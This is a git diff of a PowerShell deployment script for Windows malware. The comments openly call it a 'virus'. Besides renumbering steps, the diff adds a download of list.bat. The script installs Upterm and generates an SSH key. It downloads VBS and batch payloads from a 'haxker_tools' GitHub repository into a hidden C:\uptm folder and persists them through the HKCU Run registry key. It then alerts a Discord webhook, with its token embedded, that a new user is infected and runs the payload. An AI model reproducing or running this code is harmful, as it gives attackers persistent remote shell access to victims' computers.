@@ -18,7 +18,7 @@ if (Get-Command scoop -ErrorAction SilentlyContinue) {
     }
 }
 
-# 1.5 Install Git (required for Scoop buckets)
+# 2. Install Git (required for Scoop buckets)
 if (Get-Command git -ErrorAction SilentlyContinue) {
     Write-Host "Git is already installed."
 } else {
@@ -26,7 +26,7 @@ if (Get-Command git -ErrorAction SilentlyContinue) {
     scoop install git
 }
 
-# 2. Check & Install Upterm
+# 3. Check & Install Upterm
 if (Get-Command upterm -ErrorAction SilentlyContinue) {
     Write-Host "Upterm is already installed."
 } else {
@@ -35,7 +35,7 @@ if (Get-Command upterm -ErrorAction SilentlyContinue) {
     scoop install upterm
 }
 
-# 2.5 Generate SSH Key for Upterm (if not exists)
+# 4. Generate SSH Key for Upterm (if not exists)
 $sshDir = "$env:USERPROFILE\.ssh"
 $privateKey = "$sshDir\id_ed25519"
 $publicKey = "$sshDir\id_ed25519.pub"
@@ -60,7 +60,7 @@ if (!(Test-Path $privateKey)) {
     Write-Host "ED25519 SSH key already exists."
 }
 
-# 3. Create Directory
+# 5. Create Directory
 $dir = "C:\uptm"
 if (!(Test-Path $dir)) {
     Write-Host "Creating directory $dir"
@@ -69,13 +69,13 @@ if (!(Test-Path $dir)) {
     Set-ItemProperty -Path "$dir" -Name Attributes -Value "Hidden"
 }
 
-# 4. Download Startup Script
+# 6. Download Startup Script
 $vbsUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/hack_PC_cmd/AutoRun/auto_host.vbs"
 $vbsPath = "C:\uptm\auto_host.vbs"
 Write-Host "Downloading auto_host.vbs..."
 Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing
 
-# 4.5 Auto Startup Setup
+# 7. Auto Startup Setup
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $valueName = "AutoHostScript"
 
@@ -85,22 +85,28 @@ New-ItemProperty -Path $registryPath -Name $valueName -Value "wscript.exe `"$vbs
 # or
 # reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AutoHostScript" /t REG_SZ /d "wscript.exe \`"$vbsPath\`"" /f
 
-# 5. Download Main Batch
+# 8. Download Main Batch
 $batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/host_uptm.bat"
 $batPath = "C:\uptm\host_uptm.bat"
 Write-Host "Downloading host_uptm.bat..."
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
 
-# 6. Download Update Virus Batch
+# 9. Download Automatic restart File
+$listbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/list.bat"
+$listbatPath = "C:\uptm\list.bat"
+Write-Host "Downloading list.bat..."
+Invoke-WebRequest -Uri $listbatUrl -OutFile $listbatPath -UseBasicParsing
+
+# 10. Download Update Virus Batch
 $dbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/update.bat"
 $dbatPath = "C:\uptm\update.bat"
 Write-Host "Downloading update.bat..."
 Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing
 
-# 6.5 Hint New User
+# 11. Hint New User
 Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1508834299049148597/34nknYuISCFwshV07VmY88rpk4fXD8pGfZPBZVGFyMax9ckOpjJC07z9mG6czsQAgoBA" -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes((@{embeds=@(@{title="新使用者中病毒";footer=@{text="等待可連接ssh通知"};color=16711680})} | ConvertTo-Json -Depth 5))) -ContentType "application/json; charset=utf-8"
 
-# 7. Start Virus
+# 12. Start Virus
 wscript.exe "$vbsPath"
 
 Write-Host "Deployment completed successfully."
